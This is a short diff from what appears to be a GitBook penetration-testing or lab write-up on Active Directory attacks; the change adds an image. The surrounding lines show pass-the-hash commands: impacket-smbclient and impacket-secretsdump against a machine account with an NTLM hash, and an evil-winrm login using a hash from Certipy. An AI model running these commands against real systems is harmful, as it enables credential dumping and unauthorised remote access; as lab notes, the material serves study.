@@ -512,7 +512,7 @@ impacket-smbclient -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN1
 
 impacket-secretsdump -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN10-EXEC01$@44.221.50.166'
 
-
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 evil-winrm -i 44.221.50.166 -u 'TARGET\_USER' -H '\<HASH\_FROM\_CERTIPY>'
 
